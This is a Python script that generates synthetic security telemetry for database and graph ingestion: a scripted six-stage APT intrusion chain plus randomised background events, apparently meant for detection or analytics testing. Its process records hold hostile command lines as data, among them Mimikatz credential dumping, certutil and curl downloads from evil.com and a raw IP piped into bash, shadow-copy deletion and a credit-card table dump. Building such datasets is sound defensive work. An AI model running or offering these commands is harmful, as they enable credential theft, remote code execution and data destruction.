import datetime
import random
import uuid

class TelemetryGenerator:
    """
    Generates realistic security telemetry event streams for NoSQL database ingestion.
    Supports both core APT attack path generation and full enterprise multi-subnet telemetry dataset generation (80+ events, 60+ graph nodes).
    """

    def __init__(self):
        self.base_time = datetime.datetime(2026, 8, 22, 14, 0, 0)

    def generate_apt_attack_sequence(self):
        """Generates the primary 6-stage APT attack chain."""
        logs = []
        
        # Stage 1: External Authentication / Compromised User Login
        t1 = self.base_time
        logs.append({
            "event_id": f"EVT-APT-1001",
            "timestamp": t1.isoformat() + "Z",
            "event_type": "AUTHENTICATION",
            "stage": "Initial Access",
            "user": {"username": "admin_temp", "domain": "CORP", "is_privileged": False},
            "host": {"host_id": "HOST-JUMPBOX-01", "hostname": "jumpbox.corp.internal", "ip": "10.0.1.10", "criticality": "MEDIUM"},
            "network": {"src_ip": "198.51.100.44", "dst_ip": "10.0.1.10", "port": 3389, "protocol": "RDP"},
            "severity": "MEDIUM",
            "description": "User admin_temp authenticated via RDP from untrusted external IP 198.51.100.44"
        })

        # Stage 2: Suspicious Process Creation (Mimikatz / Credential Dumping)
        t2 = t1 + datetime.timedelta(minutes=5)
        logs.append({
            "event_id": f"EVT-APT-1002",
            "timestamp": t2.isoformat() + "Z",
            "event_type": "PROCESS_SPAWN",
            "stage": "Execution & Privilege Escalation",
            "user": {"username": "admin_temp", "domain": "CORP", "is_privileged": True},
            "host": {"host_id": "HOST-JUMPBOX-01", "hostname": "jumpbox.corp.internal", "ip": "10.0.1.10", "criticality": "MEDIUM"},
            "process": {
                "pid": 4120,
                "name": "powershell.exe",
                "parent_name": "explorer.exe",
                "command_line": "powershell.exe -ExecutionPolicy Bypass -c Invoke-Mimikatz -DumpCreds",
                "hash_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
                "is_suspicious": True
            },
            "severity": "HIGH",
            "description": "Suspicious PowerShell process spawned executing Mimikatz credential dumping script"
        })

        # Stage 3: Vulnerability Scanning & Exploitation
        t3 = t2 + datetime.timedelta(minutes=10)
        logs.append({
            "event_id": f"EVT-APT-1003",
            "timestamp": t3.isoformat() + "Z",
            "event_type": "VULNERABILITY_EXPLOIT",
            "stage": "Privilege Escalation",
            "host": {"host_id": "HOST-JUMPBOX-01", "hostname": "jumpbox.corp.internal", "ip": "10.0.1.10", "criticality": "MEDIUM"},
            "vulnerability": {
                "cve_id": "CVE-2024-30078",
                "cvss_score": 8.8,
                "description": "Windows Wi-Fi / Remote Code Execution Vulnerability"
            },
            "severity": "HIGH",
            "description": "Exploitation attempt detected targeting CVE-2024-30078 on HOST-JUMPBOX-01"
        })

        # Stage 4: Lateral Movement to High-Value Asset (Production Database Host)
        t4 = t3 + datetime.timedelta(minutes=15)
        logs.append({
            "event_id": f"EVT-APT-1004",
            "timestamp": t4.isoformat() + "Z",
            "event_type": "LATERAL_MOVEMENT",
            "stage": "Lateral Movement",
            "user": {"username": "NT AUTHORITY\\SYSTEM", "domain": "NT AUTHORITY", "is_privileged": True},
            "source_host": {"host_id": "HOST-JUMPBOX-01", "ip": "10.0.1.10"},
            "target_host": {"host_id": "HOST-DB-PROD-01", "hostname": "db-prod-01.corp.internal", "ip": "10.0.4.50", "criticality": "CRITICAL"},
            "network": {"src_ip": "10.0.1.10", "dst_ip": "10.0.4.50", "port": 445, "protocol": "SMB"},
            "severity": "CRITICAL",
            "description": "Lateral movement established from HOST-JUMPBOX-01 to HOST-DB-PROD-01 over SMB Port 445"
        })

        # Stage 5: Target Host Remote Code Execution
        t5 = t4 + datetime.timedelta(minutes=5)
        logs.append({
            "event_id": f"EVT-APT-1005",
            "timestamp": t5.isoformat() + "Z",
            "event_type": "PROCESS_SPAWN",
            "stage": "Target Compromise",
            "user": {"username": "NT AUTHORITY\\SYSTEM", "domain": "NT AUTHORITY", "is_privileged": True},
            "host": {"host_id": "HOST-DB-PROD-01", "hostname": "db-prod-01.corp.internal", "ip": "10.0.4.50", "criticality": "CRITICAL"},
            "process": {
                "pid": 8812,
                "name": "cmd.exe",
                "parent_name": "psexecsvc.exe",
                "command_line": "cmd.exe /c sqlcmd -Q 'SELECT * FROM CustomerCreditCards' > exfil.dat",
                "hash_sha256": "8f34b1234567890abcdef1234567890abcdef1234567890abcdef1234567890a",
                "is_suspicious": True
            },
            "severity": "CRITICAL",
            "description": "PsExec remote execution dumping database sensitive tables into exfil file"
        })

        # Stage 6: Data Exfiltration to Command & Control (C2) Server
        t6 = t5 + datetime.timedelta(minutes=8)
        logs.append({
            "event_id": f"EVT-APT-1006",
            "timestamp": t6.isoformat() + "Z",
            "event_type": "DATA_EXFILTRATION",
            "stage": "Exfiltration",
            "host": {"host_id": "HOST-DB-PROD-01", "hostname": "db-prod-01.corp.internal", "ip": "10.0.4.50", "criticality": "CRITICAL"},
            "network": {
                "src_ip": "10.0.4.50",
                "dst_ip": "194.26.29.112",
                "dst_port": 443,
                "protocol": "HTTPS",
                "bytes_transferred": 524288000  # 500 MB
            },
            "severity": "CRITICAL",
            "description": "Large outbound encrypted data transfer (500MB) from HOST-DB-PROD-01 to external C2 IP 194.26.29.112"
        })

        return logs

    def generate_enterprise_telemetry_dataset(self):
        """
        Generates 80+ realistic security telemetry records across 20+ Hosts, 15+ Users, 25+ Processes,
        15+ IP addresses, and 8+ CVE Vulnerabilities to guarantee >50 graph nodes and >50 database records.
        """
        logs = self.generate_apt_attack_sequence()

        users = [
            ("jsmith", "CORP", False), ("kwilliams", "CORP", False), ("mchen", "CORP", False),
            ("alopez", "FINANCE", False), ("bdavis", "HR", False), ("ad_admin", "CORP", True),
            ("sec_analyst", "CORP", True), ("dev_lead", "ENGINEERING", False),
            ("service_sql", "CORP", True), ("guest_user", "GUEST", False),
            ("rpatel", "FINANCE", False), ("sjohansson", "SALES", False),
            ("tkmurthy", "RESEARCH", True), ("cbohn", "IT_OPS", True), ("eporter", "LEGAL", False)
        ]

        hosts = [
            ("HOST-WEB-DMZ-01", "web-dmz-01.corp.internal", "10.0.1.20", "MEDIUM"),
            ("HOST-WEB-DMZ-02", "web-dmz-02.corp.internal", "10.0.1.21", "MEDIUM"),
            ("HOST-AD-DC-01", "dc-01.corp.internal", "10.0.2.5", "CRITICAL"),
            ("HOST-AD-DC-02", "dc-02.corp.internal", "10.0.2.6", "CRITICAL"),
            ("HOST-FIN-WS-01", "fin-ws-01.corp.internal", "10.0.3.15", "HIGH"),
            ("HOST-FIN-WS-02", "fin-ws-02.corp.internal", "10.0.3.16", "MEDIUM"),
            ("HOST-ENG-WS-01", "eng-ws-01.corp.internal", "10.0.3.30", "LOW"),
            ("HOST-ENG-WS-02", "eng-ws-02.corp.internal", "10.0.3.31", "LOW"),
            ("HOST-HR-WS-01", "hr-ws-01.corp.internal", "10.0.3.45", "LOW"),
            ("HOST-APP-PROD-01", "app-prod-01.corp.internal", "10.0.4.10", "HIGH"),
            ("HOST-APP-STAGING-01", "app-staging-01.corp.internal", "10.0.4.11", "MEDIUM"),
            ("HOST-DB-BACKUP-01", "db-backup-01.corp.internal", "10.0.4.55", "CRITICAL"),
            ("HOST-SIEM-01", "siem.corp.internal", "10.0.2.100", "HIGH"),
            ("HOST-VPN-GATEWAY", "vpn.corp.internal", "10.0.1.1", "HIGH"),
            ("HOST-MAIL-01", "mail.corp.internal", "10.0.1.30", "HIGH"),
            ("HOST-PROXY-01", "proxy.corp.internal", "10.0.1.5", "MEDIUM"),
            ("HOST-FILE-SHARE-01", "files.corp.internal", "10.0.3.100", "HIGH"),
            ("HOST-DEV-BUILD-01", "build.corp.internal", "10.0.3.200", "LOW")
        ]

        processes = [
            ("svchost.exe", "svchost.exe -k netsvcs", False, 1200),
            ("lsass.exe", "C:\\Windows\\System32\\lsass.exe", False, 672),
            ("nginx.exe", "nginx -g 'daemon off;'", False, 3040),
            ("python.exe", "python app.py --port=8080", False, 5112),
            ("cmd.exe", "cmd.exe /c whoami /all", True, 7890),
            ("vssadmin.exe", "vssadmin delete shadows /all /quiet", True, 9102),
            ("certutil.exe", "certutil -urlcache -split -f http://evil.com/payload.exe payload.exe", True, 9410),
            ("rundll32.exe", "rundll32.exe advpack.dll,LaunchINFSection payload.inf", True, 9820),
            ("sqlservr.exe", "sqlservr.exe -s MSSQLSERVER", False, 2400),
            ("bash", "/bin/bash -c 'curl http://198.51.100.99/shell.sh | bash'", True, 8810),
            ("wmic.exe", "wmic process call create 'powershell.exe'", True, 6010),
            ("net.exe", "net group 'Domain Admins' /domain", True, 6120),
            ("schtasks.exe", "schtasks /create /tn 'Persistence' /tr 'cmd.exe'", True, 6300),
            ("docker.exe", "docker run -v /:/host -it ubuntu", False, 7100),
            ("git.exe", "git clone http://github.corp.internal/repo.git", False, 7200)
        ]

        external_ips = [
            "198.51.100.44", "198.51.100.99", "185.220.101.5", "45.154.255.88", "194.26.29.112",
            "91.240.118.170", "103.224.182.20", "185.191.171.12", "5.188.206.14", "193.106.191.80"
        ]

        cves = [
            ("CVE-2023-21768", 7.8, "Windows Ancillary Function Driver Elevation of Privilege"),
            ("CVE-2024-21413", 9.8, "Microsoft Outlook Remote Code Execution Vulnerability"),
            ("CVE-2023-34362", 9.8, "MOVEit Transfer Critical Remote Code Execution"),
            ("CVE-2024-30078", 8.8, "Windows Wi-Fi RCE Vulnerability"),
            ("CVE-2023-4966", 9.4, "Citrix Bleed Information Disclosure Vulnerability"),
            ("CVE-2024-1709", 10.0, "ScreenConnect Authentication Bypass"),
            ("CVE-2023-48788", 9.8, "Fortinet FortiClientEMS Remote Code Execution"),
            ("CVE-2024-27198", 9.8, "JetBrains TeamCity Authentication Bypass")
        ]

        base_dt = self.base_time - datetime.timedelta(hours=3)

        # Generate 85 background operational and security telemetry events
        for idx in range(1, 86):
            t = base_dt + datetime.timedelta(minutes=idx * 2)
            evt_type = random.choice(["AUTHENTICATION", "PROCESS_SPAWN", "VULNERABILITY_EXPLOIT", "LATERAL_MOVEMENT", "DATA_EXFILTRATION"])

            user = random.choice(users)
            host = random.choice(hosts)
            proc = random.choice(processes)
            ext_ip = random.choice(external_ips)
            cve = random.choice(cves)

            if evt_type == "AUTHENTICATION":
                sev = "HIGH" if ext_ip in ["198.51.100.99", "185.220.101.5", "5.188.206.14"] else "LOW"
                evt = {
                    "event_id": f"EVT-BG-{1000 + idx}",
                    "timestamp": t.isoformat() + "Z",
                    "event_type": "AUTHENTICATION",
                    "stage": "Routine Access" if sev == "LOW" else "Anomalous Auth",
                    "user": {"username": user[0], "domain": user[1], "is_privileged": user[2]},
                    "host": {"host_id": host[0], "hostname": host[1], "ip": host[2], "criticality": host[3]},
                    "network": {"src_ip": ext_ip if random.random() > 0.3 else "10.0.3.50", "dst_ip": host[2], "port": 443, "protocol": "HTTPS"},
                    "severity": sev,
                    "description": f"Authentication attempt by {user[0]} on {host[0]}"
                }
            elif evt_type == "PROCESS_SPAWN":
                evt = {
                    "event_id": f"EVT-BG-{1000 + idx}",
                    "timestamp": t.isoformat() + "Z",
                    "event_type": "PROCESS_SPAWN",
                    "stage": "Process Execution",
                    "user": {"username": user[0], "domain": user[1], "is_privileged": user[2]},
                    "host": {"host_id": host[0], "hostname": host[1], "ip": host[2], "criticality": host[3]},
                    "process": {
                        "pid": proc[3] + idx,
                        "name": proc[0],
                        "command_line": proc[1],
                        "hash_sha256": f"hash_{proc[0]}_{idx}",
                        "is_suspicious": proc[2]
                    },
                    "severity": "HIGH" if proc[2] else "LOW",
                    "description": f"Process {proc[0]} spawned on {host[0]}"
                }
            elif evt_type == "VULNERABILITY_EXPLOIT":
                evt = {
                    "event_id": f"EVT-BG-{1000 + idx}",
                    "timestamp": t.isoformat() + "Z",
                    "event_type": "VULNERABILITY_EXPLOIT",
                    "stage": "Vulnerability Assessment",
                    "host": {"host_id": host[0], "hostname": host[1], "ip": host[2], "criticality": host[3]},
                    "vulnerability": {
                        "cve_id": cve[0],
                        "cvss_score": cve[1],
                        "description": cve[2]
                    },
                    "severity": "CRITICAL" if cve[1] >= 9.0 else "HIGH",
                    "description": f"Security scan identified vulnerability {cve[0]} on {host[0]}"
                }
            elif evt_type == "LATERAL_MOVEMENT":
                target_host = random.choice([h for h in hosts if h[0] != host[0]])
                evt = {
                    "event_id": f"EVT-BG-{1000 + idx}",
                    "timestamp": t.isoformat() + "Z",
                    "event_type": "LATERAL_MOVEMENT",
                    "stage": "Internal Communication",
                    "user": {"username": user[0], "domain": user[1], "is_privileged": user[2]},
                    "source_host": {"host_id": host[0], "ip": host[2]},
                    "target_host": {"host_id": target_host[0], "hostname": target_host[1], "ip": target_host[2], "criticality": target_host[3]},
                    "network": {"src_ip": host[2], "dst_ip": target_host[2], "port": 445, "protocol": "SMB"},
                    "severity": "MEDIUM",
                    "description": f"Network session established between {host[0]} and {target_host[0]}"
                }
            else:
                evt = {
                    "event_id": f"EVT-BG-{1000 + idx}",
                    "timestamp": t.isoformat() + "Z",
                    "event_type": "DATA_EXFILTRATION",
                    "stage": "Network Traffic",
                    "host": {"host_id": host[0], "hostname": host[1], "ip": host[2], "criticality": host[3]},
                    "network": {
                        "src_ip": host[2],
                        "dst_ip": ext_ip,
                        "dst_port": 443,
                        "protocol": "HTTPS",
                        "bytes_transferred": random.randint(100000, 50000000)
                    },
                    "severity": "MEDIUM",
                    "description": f"Outbound network connection from {host[0]} to {ext_ip}"
                }
            logs.append(evt)

        return logs

if __name__ == "__main__":
    gen = TelemetryGenerator()
    events = gen.generate_enterprise_telemetry_dataset()
    print(f"Generated {len(events)} telemetry events for dataset.")
